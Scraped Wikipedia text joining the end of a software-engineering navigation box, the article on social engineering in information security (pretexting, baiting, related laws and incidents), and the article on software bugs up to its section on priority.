Spiral model


V-model


Waterfall model


XP


Model-driven engineering


Round-trip engineering


Other


SPICE


CMMI


Data model


ER model


Function model


Information model


Metamodeling


Object model


Systems model


View model


Languages


IDEF


UML


USL


SysML


Related fields


Computer science


Computer engineering


Information science


Project management


Risk management


Systems engineering




 
Commons


 
Category












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Site_reliability_engineering&oldid=1246519706
"


Categories
: 
2003 introductions
Google
Reliability engineering
Software engineering
Hidden categories: 
Articles with short description
Short description is different from Wikidata
Articles with peacock terms from May 2023
All articles with peacock terms
Wikipedia articles containing buzzwords from May 2023
Articles with multiple maintenance issues
All articles with unsourced statements
Articles with unsourced statements from June 2023
CS1 maint: multiple names: authors list











From Wikipedia, the free encyclopedia






Psychological manipulation of people into performing actions or divulging confidential information






For the influencing of attitudes and social behaviors on a large scale, see 
social engineering (political science)
.


OPSEC
 alert


In the context of 
information security
, 
social engineering
 is the 
psychological manipulation
 of people into performing actions or divulging 
confidential information
. A type of 
confidence trick
 for the purpose of information gathering, fraud, or system access, it differs from a traditional "con" in the sense that it is often one of the many steps in a more complex fraud scheme.
[
1
]
 It has also been defined as "any act that influences a person to take an action that may or may not be in their best interests."
[
2
]


Research done in 2020 has indicated that social engineering will be one of the most prominent challenges of the upcoming decade. Having proficiency in social engineering will be increasingly important for organizations and countries, due to the impact on 
geopolitics
 as well. Social engineering raises the question of whether our decisions will be accurately informed if our primary information is engineered and biased.
[
3
]


Social engineering attacks have been increasing in intensity and number, cementing the need for novel detection techniques and cyber security educational programs.
[
4
]






Techniques and terms
[
edit
]


All social engineering techniques are based on attributes of human 
decision-making
 known as 
cognitive biases
.
[
5
]
[
6
]


One example of social engineering is an individual who walks into a building and posts an official-looking announcement to the company bulletin that says the number for the help desk has changed. So, when employees call for help the individual asks them for their passwords and IDs thereby gaining the ability to access the company's private information.
Another example of social engineering would be that the hacker contacts the target on a 
social networking site
 and starts a conversation with the target. Gradually the hacker gains the trust of the target and then uses that trust to get access to sensitive information like password or bank account details.
[
7
]




Pretexting
[
edit
]


Main article: 
Pretexting


Pretexting
 (adj. 
pretextual
), also known in the UK as 
blagging
,
[
8
]
 is the act of creating and using an invented scenario (the 
pretext
) to engage a targeted victim in a manner that increases the chance the victim will divulge information or perform actions that would be unlikely in ordinary circumstances.
[
9
]
 An elaborate 
lie
, it most often involves some prior research or setup and the use of this information for impersonation (
e.g.
, date of birth, 
Social Security number
, last bill amount) to establish legitimacy in the mind of the target.
[
10
]




Water holing
[
edit
]


Main article: 
Watering hole attack


Water holing is a targeted social engineering strategy that capitalizes on the trust users have in 
websites
 they regularly visit. The victim feels safe to do things they would not do in a different situation. A wary person might, for example, purposefully avoid clicking a link in an unsolicited email, but the same person would not hesitate to follow a link on a website they often visit. So, the attacker prepares a trap for the unwary prey at a favored watering hole. This strategy has been successfully used to gain access to some (supposedly) very secure systems.
[
11
]




Baiting
[
edit
]


Baiting is like the real-world 
Trojan horse
 that uses physical media and relies on the curiosity or greed of the victim.
[
12
]
 In this 
attack
, attackers leave 
malware
-infected 
floppy disks
, 
CD-ROMs
, or 
USB flash drives
 in locations people will find them (bathrooms, elevators, sidewalks, parking lots, etc.), give them legitimate and curiosity-piquing labels, and wait for victims.

Unless computer controls block infections, insertion compromises PCs "auto-running" media. Hostile devices can also be used.
[
13
]
 For instance, a "lucky winner" is sent a free 
digital audio player
 compromising any computer it is plugged to. A "
road apple
" (the colloquial term for horse 
manure
, suggesting the device's undesirable nature) is any 
removable media
 with malicious software left in opportunistic or conspicuous places. It may be a CD, DVD, or 
USB flash drive
, among other media. Curious people take it and plug it into a computer, infecting the host and any attached networks. Again, hackers may give them enticing labels, such as "Employee Salaries" or "Confidential".
[
14
]


One study published in 2016 had researchers drop 297 USB drives around the campus of the University of Illinois. The drives contained files on them that linked to webpages owned by the researchers. The researchers were able to see how many of the drives had files on them opened, but not how many were inserted into a computer without having a file opened. Of the 297 drives that were dropped, 290 (98%) of them were picked up and 135 (45%) of them "called home".
[
15
]




Law
[
edit
]


In 
common law
, pretexting is an invasion of 
privacy
 tort of appropriation.
[
16
]




Pretexting of telephone records
[
edit
]


In December 2006, 
United States Congress
 approved a Senate sponsored bill making the pretexting of telephone records a federal 
felony
 with fines of up to $250,000 and ten years in prison for individuals (or fines of up to $500,000 for companies). It was signed by 
President George W. Bush
 on 12 January 2007.
[
17
]




Federal legislation
[
edit
]


The 1999 
Gramm-Leach-Bliley Act
 (GLBA) is a 
U.S. Federal
 law that specifically addresses pretexting of banking records as an illegal act punishable under federal statutes. When a business entity such as a private investigator, SIU insurance investigator, or an adjuster conducts any type of deception, it falls under the authority of the 
Federal Trade Commission
 (FTC). This federal agency has the obligation and authority to ensure that consumers are not subjected to any unfair or deceptive business practices. US Federal Trade Commission Act, Section 5 of the 
FTCA
 states, in part:
"Whenever the Commission shall have reason to believe that any such person, partnership, or corporation has been or is using any unfair method of competition or unfair or deceptive act or practice in or affecting commerce, and if it shall appear to the Commission that a proceeding by it in respect thereof would be to the interest of the public, it shall issue and serve upon such person, partnership, or corporation a complaint stating its charges in that respect."

The statute states that when someone obtains any personal, non-public information from a financial institution or the consumer, their action is subject to the statute. It relates to the consumer's relationship with the financial institution. For example, a pretexter using false pretenses either to get a consumer's address from the consumer's bank, or to get a consumer to disclose the name of their bank, would be covered. The determining principle is that pretexting only occurs when information is obtained through false pretenses.

While the sale of cell telephone records has gained significant media attention, and telecommunications records are the focus of the two bills currently before the 
United States Senate
, many other types of private records are being bought and sold in the public market. Alongside many advertisements for cell phone records, wireline records and the records associated with calling cards are advertised. As individuals shift to VoIP telephones, it is safe to assume that those records will be offered for sale as well. Currently, it is legal to sell telephone records, but illegal to obtain them.
[
18
]




1st Source Information Specialists
[
edit
]


U.S. Rep. 
Fred Upton
 (R-
Kalamazoo
, Michigan), chairman of the Energy and Commerce Subcommittee on Telecommunications and the Internet, expressed concern over the easy access to personal mobile phone records on the Internet during a House Energy & Commerce Committee hearing on "
Phone Records For Sale:
 
Why Aren't Phone Records Safe From Pretexting?
" 
Illinois
 became the first state to sue an online records broker when Attorney General Lisa Madigan sued 1st Source Information Specialists, Inc. A spokeswoman for Madigan's office said. The Florida-based company operates several Web sites that sell mobile telephone records, according to a copy of the suit. The attorneys general of Florida and 
Missouri
 quickly followed Madigan's lead, filing suits respectively, against 1st Source Information Specialists and, in Missouri's case, one other records broker – First Data Solutions, Inc.

Several wireless providers, including T-Mobile, Verizon, and Cingular filed earlier lawsuits against records brokers, with Cingular winning an injunction against First Data Solutions and 1st Source Information Specialists. U.S. Senator 
Charles Schumer
 (D-New York) introduced legislation in February 2006 aimed at curbing the practice. The Consumer Telephone Records Protection Act of 2006 would create 
felony
 
criminal
 penalties for stealing and selling the records of mobile phone, 
landline
, and 
Voice over Internet Protocol
 (VoIP) subscribers.



Hewlett Packard
[
edit
]


Patricia Dunn
, former chairwoman of 
Hewlett Packard
, reported that the HP board hired a private investigation company to delve into who was responsible for leaks within the board. Dunn acknowledged that the company used the practice of pretexting to solicit the telephone records of board members and journalists. Chairman Dunn later apologized for this act and offered to step down from the board if it was desired by board members.
[
19
]
 Unlike Federal law, California law specifically forbids such pretexting. The four felony charges brought on Dunn were dismissed.
[
20
]




Notable social engineering incidents
[
edit
]


This section 
needs expansion
. You can help by 
adding to it
.  
(
May 2024
)


Equifax breach help websites
[
edit
]


Following the 
2017 Equifax data breach
 in which over 150 million private records were leaked (including 
Social Security numbers
, and 
drivers license
 numbers, birthdates, etc.), warnings were sent out regarding the dangers of impending security risks.
[
21
]
 In the day after the establishment of a legitimate help website (equifaxsecurity2017.com) dedicated to people potentially victimized by the breach, 194 malicious domains were reserved from small variations on the URL, capitalizing on the likelihood of people mistyping.
[
22
]
[
23
]




2016 United States Elections Leaks
[
edit
]


During the 
2016 United States Elections
, hackers associated with 
Russian Military Intelligence (GRU)
 sent phishing emails directed to members of 
Hillary Clinton
's campaign, disguised as a Google alert.
[
24
]
 Many members, including the chairman of the campaign, 
John Podesta
, had entered their passwords thinking it would be reset, causing their personal information, and thousands of private emails and documents to be leaked.
[
25
]
 With this information, they hacked into other computers in the 
Democratic Congressional Campaign Committee
, implanting malware in them, which caused their computer activities to be monitored and leaked.
[
25
]




Notable social engineers
[
edit
]


Susan Headley
[
edit
]


Susan Headley
 became involved in 
phreaking
 with 
Kevin Mitnick
 and Lewis de Payne in 
Los Angeles
, but later framed them for erasing the system files at US Leasing after a falling out, leading to Mitnick's first conviction. She retired to professional poker.
[
26
]




Mike Ridpath
[
edit
]


Mike Ridpath is a security consultant, published author, speaker and previous member of 
w00w00
. He is well known for developing techniques and tactics for social engineering through 
cold calling
. He became well known for live demonstrations as well as playing recorded calls after talks where he explained his thought process on what he was doing to get passwords through the phone.
[
27
]
[
28
]
[
29
]
[
30
]
[
31
]
 As a child, Ridpath was connected with Badir Brothers and was widely known within the 
phreaking
 and 
hacking
 community for his articles with popular underground 
ezines
, such as, Phrack, B4B0 and 9x on modifying Oki 900s, blueboxing, 
satellite hacking
 and RCMAC.
[
32
]
[
33
]




Badir Brothers
[
edit
]


Brothers Ramy, Muzher, and Shadde Badir—all of whom were blind from birth—managed to set up an extensive phone and computer fraud scheme in 
Israel
 in the 1990s using social engineering, voice impersonation, and 
Braille-display computers
.
[
34
]
[
35
]




Christopher J. Hadnagy
[
edit
]


Christopher J. Hadnagy
 is an American social engineer and information technology security consultant.  He is best known as an author of 4 books on social engineering and cyber security
[
36
]
[
37
]
[
38
]
[
39
]
 and founder of Innocent Lives Foundation, an organization that helps tracking and identifying child trafficking by seeking the assistance of information security specialists, using data from open-source intelligence (OSINT) and collaborating with law enforcement.
[
40
]
[
41
]




References
[
edit
]






^
 
Anderson, Ross J.
 (2008). 
Security engineering: a guide to building dependable distributed systems
 (2 ed.). Indianapolis, IN: Wiley. p. 1040. 
ISBN
 
978-0-470-06852-6
.
 Chapter 2, page 17




^
 
"Social Engineering Defined"
. 
Security Through Education
. Retrieved 
3 October
 2021
.




^
 
Guitton, Matthieu J. (1 June 2020). 
"Cybersecurity, social engineering, artificial intelligence, technological addictions: Societal challenges for the coming decade"
. 
Computers in Human Behavior
. 
107
: 106307. 
doi
:
10.1016/j.chb.2020.106307
. 
ISSN
 
0747-5632
. 
S2CID
 
214111644
.




^
 
Salahdine, Fatima (2019). 
"Social Engineering Attacks: A Survey"
. 
School of Electrical Engineering and Computer Science, University of North Dakota
. 
11
 (4): 89.




^
 
Jaco, K: "CSEPS Course Workbook" (2004), unit 3, Jaco Security Publishing.




^
 
Kirdemir, Baris (2019). 
"HOSTILE INFLUENCE AND EMERGING COGNITIVE THREATS IN CYBERSPACE"
. 
Centre for Economics and Foreign Policy Studies
.




^
 
Hatfield, Joseph M (June 2019). "Virtuous human hacking: The ethics of social engineering in penetration-testing". 
Computers & Security
. 
83
: 354–366. 
doi
:
10.1016/j.cose.2019.02.012
. 
S2CID
 
86565713
.




^
 
"Fundamentals of cyber security"
. 
BBC Bitesize
. 19 March 2019. 
Archived
 from the original on 7 July 2024
. Retrieved 
7 July
 2024
.




^
 
The story of HP pretexting scandal with discussion is available at 
Davani, Faraz (14 August 2011). 
"HP Pretexting Scandal by Faraz Davani"
. Retrieved 
15 August
 2011
 – via Scribd.




^
 
"
Pretexting: Your Personal Information Revealed
", 
Federal Trade Commission




^
 
"Chinese Espionage Campaign Compromises Forbes.com to Target US Defense, Financial Services Companies in Watering Hole Style Attack"
. invincea.com. 10 February 2015
. Retrieved 
23 February
 2017
.




^
 
"Social Engineering, the USB Way"
. Light Reading Inc. 7 June 2006. Archived from 
the original
 on 13 July 2006
. Retrieved 
23 April
 2014
.




^
 
"Archived copy"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on 11 October 2007
. Retrieved 
2 March
 2012
.
{{
cite web
}}
:  CS1 maint: archived copy as title (
link
)




^
 
Conklin, Wm. Arthur; White, Greg; Cothren, Chuck; Davis, Roger; Williams, Dwayne (2015). 
Principles of Computer Security, Fourth Edition (Official Comptia Guide)
. New York: McGraw-Hill Education. pp. 193–194. 
ISBN
 
978-0071835978
.




^
 
Raywood, Dan (4 August 2016). 
"#BHUSA Dropped USB Experiment Detailed"
. 
info security
. Retrieved 
28 July
 2017
.




^
 
Restatement 2d of Torts § 652C.




^
 
"Congress outlaws pretexting"
. 
109th Congress (2005–2006) H.R.4709 – Telephone Records and Privacy Protection Act of 2006
. 2007.




^
 
Mitnick, K (2002): "The Art of Deception", p. 103 Wiley Publishing Ltd: Indianapolis, Indiana; United States of America. 
ISBN
 
0-471-23712-4




^
 
HP chairman: Use of pretexting 'embarrassing'
 Stephen Shankland, 8 September 2006 1:08 PM PDT 
CNET
 News.com




^
 
"Calif. court drops charges against Dunn"
. CNET. 14 March 2007
. Retrieved 
11 April
 2012
.




^
 
"Credit reporting firm Equifax says data breach could potentially affect 143 million US consumers"
. CNBC. 7 September 2018
. Retrieved 
3 May
 2024
.




^
 
"Straight Talk: Beware scams related to Equifax data breach"
. Archived from 
the original
 on 6 December 2020.
 




^
 
"Phishing"
. 
Security Through Education
. Social-Engineer.




^
 
"2016 Presidential Campaign Hacking Fast Facts"
. 
CNN
. 27 December 2016
. Retrieved 
7 August
 2024
.




^ 
a
 
b
 
"Office of Public Affairs | Grand Jury Indicts 12 Russian Intelligence Officers for Hacking Offenses Related to the 2016 Election | United States Department of Justice"
. 
www.justice.gov
. 13 July 2018
. Retrieved 
7 August
 2024
.




^
 
Hafner, Katie (August 1995). 
"Kevin Mitnick, unplugged"
. 
Esquire
. 
124
 (2): 80(9).




^
 
Social Engineering: Manipulating the human
. Scorpio Net Security Services. 16 May 2013. 
ISBN
 
9789351261827
. Retrieved 
11 April
 2012
.




^
 
Niekerk, Brett van. 
"Mobile Devices and the Military: useful Tool or Significant Threat"
. 
Proceedings of the 4th Workshop on Ict Uses in Warfare and the Safeguarding of Peace 2012 (Iwsp 2012) and Journal of Information Warfare
. academia.edu
. Retrieved 
11 May
 2013
.




^
 
"Social Engineering: Manipulating the human"
. YouTube. 7 October 2011
. Retrieved 
11 April
 2012
.




^
 
"BsidesPDX Track 1 10/07/11 02:52PM, BsidesPDX Track 1 10/07/11 02:52PM BsidesPDX on USTREAM. Conference"
. Ustream.tv. 7 October 2011. Archived from 
the original
 on 4 August 2012
. Retrieved 
11 April
 2012
.




^
 
"Automated Social Engineering"
. BrightTALK. 29 September 2011
. Retrieved 
11 April
 2012
.




^
 
"Social Engineering a General Approach"
 
(PDF)
. Informatica Economica journal
. Retrieved 
11 January
 2015
.




^
 
"Cyber Crime"
. Hays. 7 November 2018. 
ISBN
 
9781839473036
. Retrieved 
11 January
 2020
.




^
 
"Wired 12.02: Three Blind Phreaks"
. 
Wired
. 14 June 1999
. Retrieved 
11 April
 2012
.




^
 
"Social Engineering A Young Hacker's Tale"
 
(PDF)
. 15 February 2013
. Retrieved 
13 January
 2020
.
 
{{
cite journal
}}
: 
Cite journal requires 
|journal=
 (
help
)




^
 
"43 Best Social Engineering Books of All Time"
. 
BookAuthority
. Retrieved 
22 January
 2020
.




^
 
"Bens Book of the Month Review of Social Engineering The Science of Human Hacking"
. 
RSA Conference
. 31 August 2018
. Retrieved 
22 January
 2020
.




^
 
"Book Review: Social Engineering: The Science of Human Hacking"
. 
The Ethical Hacker Network
. 26 July 2018
. Retrieved 
22 January
 2020
.




^
 
Hadnagy, Christopher; Fincher, Michele (22 January 2020). 
"Phishing Dark Waters: The Offensive and Defensive Sides of Malicious E-mails"
. 
ISACA
. Retrieved 
22 January
 2020
.




^
 
"WTVR:"Protect Your Kids from Online Threats"




^
 
Larson, Selena (14 August 2017). 
"Hacker creates organization to unmask child predators"
. CNN
. Retrieved 
14 November
 2019
.






Further reading
[
edit
]




Boyington, Gregory. (1990). 'Baa Baa Black Sheep' Published by Gregory Boyington 
ISBN
 
0-553-26350-1


Harley, David. 1998 
Re-Floating the Titanic: Dealing with Social Engineering Attacks
 EICAR Conference.


Laribee, Lena. June 2006 
Development of methodical social engineering taxonomy project
 Master's Thesis, Naval Postgraduate School.


Leyden, John. 18 April 2003. 
Office workers give away passwords for a cheap pen
. 
The Register
. Retrieved 2004-09-09.


Mann, Ian. (2008). 
Hacking the Human: Social Engineering Techniques and Security Countermeasures
 Published by Gower Publishing Ltd. 
ISBN
 
0-566-08773-1
 or 
ISBN
 
978-0-566-08773-8


Mitnick, Kevin
, 
Kasperavičius, Alexis
. (2004). 
CSEPS
 Course Workbook
. Mitnick Security Publishing.


Mitnick, Kevin
, Simon, William L., 
Wozniak, Steve
,. (2002). 
The Art of Deception: Controlling the Human Element of Security
 Published by Wiley. 
ISBN
 
0-471-23712-4
 or 
ISBN
 
0-7645-4280-X


Hadnagy, Christopher, (2011) 
Social Engineering: The Art of Human Hacking
 Published by Wiley. 
ISBN
 
0-470-63953-9


N.J. Evans. (2009). "Information Technology Social Engineering: An Academic Definition and Study of Social Engineering-Analyzing the Human Firewall." Graduate Theses and Dissertations. 10709. 
https://lib.dr.iastate.edu/etd/10709


Z. Wang, L. Sun and H. Zhu. (2020) "Defining Social Engineering in Cybersecurity," in IEEE Access, vol. 8, pp. 85094-85115, 
doi:10.1109/ACCESS.2020.2992807
.




External links
[
edit
]








Wikimedia Commons has media related to 
Social engineering (security)
.




Social Engineering Fundamentals
 – 
Securityfocus.com
. Retrieved 3 August 2009.


"Social Engineering, the USB Way"
. Light Reading Inc. 7 June 2006. Archived from 
the original
 on 13 July 2006
. Retrieved 
23 April
 2014
.


Should Social Engineering be a part of Penetration Testing?
 – 
Darknet.org.uk
. Retrieved 3 August 2009.


"Protecting Consumers' Phone Records"
, 
Electronic Privacy Information Center
 
US Committee on Commerce, Science, and Transportation
. Retrieved 8 February 2006.


Plotkin, Hal. 
Memo to the Press: Pretexting is Already Illegal
. Retrieved 9 September 2006.


v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Social_engineering_(security)&oldid=1245801261
"


Categories
: 
Social engineering (security)
Cybercrime
Deception
Hidden categories: 
CS1 maint: archived copy as title
CS1 errors: missing periodical
Articles with short description
Short description is different from Wikidata
Use dmy dates from August 2020
Articles to be expanded from May 2024
All articles to be expanded
Commons category link is on Wikidata











From Wikipedia, the free encyclopedia






Bug in software


To report a 
MediaWiki
 error on Wikipedia, see 
Wikipedia:Bug reports
.






Part of a series on
Software development


Core activities


Data modeling


Processes


Requirements


Design


Construction


Engineering


Testing


Debugging


Deployment


Maintenance




Paradigms and models


Agile


Cleanroom


Incremental


Prototyping


Spiral


V model


Waterfall




Methodologies
 and frameworks


ASD


DevOps


DAD


DSDM


FDD


IID


Kanban


Lean SD


LeSS


MDD


MSF


PSP


RAD


RUP


SAFe


Scrum


SEMAT


TDD


TSP


UP


XP




Supporting disciplines


Configuration management


 Deployment management


Documentation


Software quality assurance


Project management


User experience




Practices


ATDD


BDD


CCO


CI


CD


DDD


PP


SBE


Stand-up


TDD




Tools


Compiler


Debugger


Profiler


GUI designer


UML Modeling


IDE


Build automation


Release automation


Infrastructure as code




Standards and bodies of knowledge


CMMI


IEEE standards


ISO 9001


ISO/IEC standards


PMBOK


SWEBOK


ITIL


IREB


OMG




Glossaries


Artificial intelligence


Computer science


Electrical and electronics engineering




Outlines


Outline of software development


v
t
e


A 
software bug
 is a 
bug
 in 
computer software
.

A 
computer program
 with many or serious bugs may be described as 
buggy
. 

The effects of a software bug range from minor (such as a misspelled word in the 
user interface
) to severe (such as frequent 
crashing
).

Software bugs have been linked to disasters. Software bugs in the 
Therac-25
 
radiation therapy
 machine were directly responsible for patient deaths in the 1980s. In 1996, the 
European Space Agency
's US$1 billion prototype 
Ariane 5 rocket was destroyed
 less than a minute after launch due to a bug in the on-board guidance computer program.
[
1
]

In 1994, an 
RAF Chinook helicopter crashed
, killing 29; was initially blamed on pilot error, but was later thought to have been caused by a software bug in the 
engine-control computer
.
[
2
]

Buggy software caused the early 21st century 
British Post Office scandal
.
[
3
]


In 2002, a study commissioned by the US 
Department of Commerce
's 
National Institute of Standards and Technology
 concluded that "software bugs, or errors, are so prevalent and so detrimental that they cost the US economy an estimated $59 billion annually, or about 0.6 percent of the gross domestic product".
[
4
]


Since the 1950s, some computer systems have been designed to detect or auto-correct various software errors during operations.





History
[
edit
]


Further information: 
Bug (engineering) § History


Terminology
[
edit
]


Mistake metamorphism
 (from Greek 
meta
 = "change", 
morph
 = "form") refers to the evolution of a defect in the final stage of software deployment. Transformation of a "mistake" committed by an analyst in the early stages of the software development lifecycle, which leads to a "defect" in the final stage of the cycle has been called 'mistake metamorphism'.
[
5
]


Different stages of a mistake in the development cycle may be described as mistake,
[
6
]
: 31 

anomaly,
[
6
]
: 10 

fault,
[
6
]
: 31 

failure,
[
6
]
: 31 

error,
[
6
]
: 31 

exception,
[
6
]
: 31 

crash,
[
6
]
: 22 

glitch,
bug,
[
6
]
: 14 

defect,
incident,
[
6
]
: 39 

or side effect. 



Controversy
[
edit
]


Sometimes the use of 
bug
 to describe the behavior of software is contentious due to perception. Some suggest that the term should be abandoned; replaced with 
defect
 or 
error
.

Some contend that 
bug
 implies that the defect arose on its own and push to use 
defect
 instead since it more clearly connotates caused by a human.
[
7
]


Some contend that 
bug
 may be used to 
coverup
 an intentional design decision. In 2011, after receiving scrutiny from US Senator 
Al Franken
 for recording and storing users' locations in unencrypted files,
[
8
]

Apple called the behavior a bug. However, Justin Brookman of the 
Center for Democracy and Technology
 directly challenged that portrayal, stating "I'm glad that they are fixing what they call bugs, but I take exception with their strong denial that they track users."
[
9
]




Prevention
[
edit
]


Error resulting from a software bug displayed on two screens at 
La Croix de Berny station
 in France


Preventing bugs as early as possible in the 
software development process
 is a target of investment and innovation.
[
10
]
[
11
]




Language support
[
edit
]


Newer 
programming languages
 tend to be designed to prevent common bugs based on vulnerabilities of existing languages. Lessons learned from older languages such as 
BASIC
 and 
C
 are used to inform the design of later languages such as 
C#
 and 
Rust
.

Languages may include features such as a static 
type system
, restricted 
namespaces
 and 
modular programming
. For example, for a typed, compiled language (like 
C
):



float num = "3";



is syntactically correct, but fails type checking since the right side, a string, cannot be assigned to a float variable. Compilation fails – forcing this defect to be fixed before development progress can resume. With an interpreted language, a failure would not occur until later at runtime.

Some languages exclude features that easily lead to bugs, at the expense of slower performance – the principle being that it is usually better to write simpler, slower correct code than complicated, buggy code. For example, the 
Java
 does not support 
pointer
 arithmetic which is generally fast, but is considered dangerous; relatively easy to cause a major bug. 

Some languages include features that add runtime overhead in order to prevent some bugs. For example, many languages include runtime 
bounds checking
 and a way to handle out-of-bounds conditions instead of crashing.

A 
compiled
 language allows for detecting some typos (such as a misspelled identifier) before 
runtime
 which is earlier in the 
software development process
 than for an 
interpreted
 language.



Techniques
[
edit
]


Programming techniques such as 
programming style
 and 
defensive programming
 are intended to prevent typos.

For example, a bug may be caused by a relatively minor, typographical error (typo) in the code. For example, this code executes function 
foo
 only if 
condition
is true.



if (condition) foo();



But this code always executes 
foo
:



if (condition); foo();



A convention that tends to prevent this particular issue is to require braces for a block even if it has just one line.



if (condition) {
  foo();
}



Enforcement of conventions may be manual (i.e. via 
code review
) or via automated tools.



Specification
[
edit
]


Some contend that writing a 
program specification
 which states the behavior of a program, can prevent bugs. 

Some contend that formal specifications are impractical for anything but the shortest programs, because of problems of 
combinatorial explosion
 and 
indeterminacy
.



Software testing
[
edit
]


One goal of 
software testing
 is to find bugs. 

Measurements during testing can provide an estimate of the number of likely bugs remaining. This becomes more reliable the longer a product is tested and developed.
[
citation needed
]




Agile practices
[
edit
]


Agile software development
 may involve frequent software releases with relatively small changes. Defects are revealed by user feedback.

With 
test-driven development
 (TDD), 
unit tests
 are written while writing the production code, and the production code is not considered complete until all tests complete successfully.



Static analysis
[
edit
]


Tools for 
static code analysis
 help developers by inspecting the program text beyond the compiler's capabilities to spot potential problems. Although in general the problem of finding all programming errors given a specification is not solvable (see 
halting problem
), these tools exploit the fact that human programmers tend to make certain kinds of simple mistakes often when writing software.



Instrumentation
[
edit
]


Tools to monitor the performance of the software as it is running, either specifically to find problems such as 
bottlenecks
 or to give assurance as to correct working, may be embedded in the code explicitly (perhaps as simple as a statement saying 
PRINT "I AM HERE"
), or provided as tools. It is often a surprise to find where most of the time is taken by a piece of code, and this removal of assumptions might cause the code to be rewritten.



Open source
[
edit
]


Open source
 development allows anyone to examine source code. A school of thought popularized by 
Eric S. Raymond
 as 
Linus's law
 says that popular 
open-source software
 has more chance of having few or no bugs than other software, because "given enough eyeballs, all bugs are shallow".
[
12
]
 This assertion has been disputed, however: computer security specialist 
Elias Levy
 wrote that "it is easy to hide vulnerabilities in complex, little understood and undocumented source code," because, "even if people are reviewing the code, that doesn't mean they're qualified to do so."
[
13
]
 An example of an open-source software bug was the 
2008 OpenSSL vulnerability in Debian
.



Debugging
[
edit
]


Main article: 
Debugging


Debugging
 can be a significant part of the 
software development lifecycle
. 
Maurice Wilkes
, an early computing pioneer, described his realization in the late 1940s that
“a good part of the remainder of my life was going to be spent in finding errors in my own programs”.
[
14
]


A program known as a 
debugger
 can help a programmer find faulty code by examining the inner workings of a program such as executing code line-by-line and viewing variable values. 

As an alternative to using a debugger, code may be instrumented with logic to output debug information to trace program execution and view values. Output is typically to 
console
, 
window
, 
log file
 or a 
hardware
 output (i.e. 
LED
).

Some contend that locating a bug is something of an art. 

It is not uncommon for a bug in one section of a program to cause failures in a different section,
[
citation needed
]
 thus making it difficult to track, in an apparently unrelated part of the system. For example, an error in a graphics 
rendering
 routine causing a file 
I/O
 routine to fail.

Sometimes, the most difficult part of debugging is finding the cause of the bug. Once found, correcting the problem is sometimes easy if not trivial. 

Sometimes, a bug is not an isolated flaw, but represents an error of thinking or planning on the part of the programmers. Often, such a 
logic error
 requires a section of the program to be overhauled or rewritten. 

Some contend that as a part of 
code review
, stepping through the code and imagining or transcribing the execution process may often find errors without ever reproducing the bug as such.

Typically, the first step in locating a bug is to reproduce it reliably. If unable to reproduce the issue, a programmer cannot find the cause of the bug and therefore cannot fix it.

Some bugs are revealed by inputs that may be difficult for the programmer to re-create. One cause of the 
Therac-25
 radiation machine deaths was a bug (specifically, a 
race condition
) that occurred only when the machine operator very rapidly entered a treatment plan; it took days of practice to become able to do this, so the bug did not manifest in testing or when the manufacturer attempted to duplicate it. Other bugs may stop occurring whenever the setup is augmented to help find the bug, such as running the program with a debugger; these are called 
heisenbugs
 (humorously named after the 
Heisenberg uncertainty principle
).

Since the 1990s, particularly following the 
Ariane 5 Flight 501
 disaster, interest in automated aids to debugging rose, such as 
static code analysis
 by 
abstract interpretation
.
[
15
]


Often, bugs come about during coding, but faulty design documentation may cause a bug. 
In some cases, changes to the code may eliminate the problem even though the code then no longer matches the documentation. 

In an 
embedded system
, the software is often modified to 
work around
 a hardware bug since it's cheaper than modifying the hardware.



Management
[
edit
]


Example bug history (
GNU Classpath
 project data). A new bug is initially 
unconfirmed.
 Once reproducibility is confirmed, it is changed to 
confirmed
. Once the issue is resolved, it is changed to 
fixed
.


Bugs are managed via activities like documenting, categorizing, assigning, reproducing, correcting and releasing the corrected code. 

Tools
 are often used to track bugs and other issues with software. Typically, different tools
are used by the software development team to 
track their workload
 than by 
customer service
 to 
track user feedback
.
[
16
]


A tracked item is often called 
bug
, 
defect
, 
ticket
, 
issue
, 
feature
, or for 
agile software development
, 
story
 or 
epic
. Items are often categorized by aspects such as severity, priority and 
version number
.

In a process sometimes called 
triage
, choices are made for each bug about whether and when to fix it based on information such as the bug's severity and priority and external factors such as development schedules. Triage generally does not include investigation into cause. Triage may occur regularly. Triage generally consists of reviewing new bugs since the previous triage and maybe all open bugs. Attendees may include project manager, development manager, test manager, build manager, and technical experts.
[
17
]
[
18
]




Severity
[
edit
]


Severity
 is a measure of impact the bug has.
[
19
]
 This impact may be data loss, financial, loss of goodwill and wasted effort. Severity levels are not standardized, but differ by context such as industry and tracking tool. For example, a crash in a video game has a different impact than a crash in a bank server. Severity levels might be 
crash or hang
, 
no workaround
 (user cannot accomplish a task), 
has workaround
 (user can still accomplish the task), 
visual defect
 (a misspelling for example), or 
documentation error
. Another example set of severities: 
critical
, 
high
, 
low
, 
blocker
, 
trivial
.
[
20
]
 The severity of a bug may be a separate category to its priority for fixing, or the two may be quantified and managed separately.

A bug severe enough to delay the release of the product is called a 
show stopper
.
[
21
]
[
22
]




Priority
[
edit
]


Priority
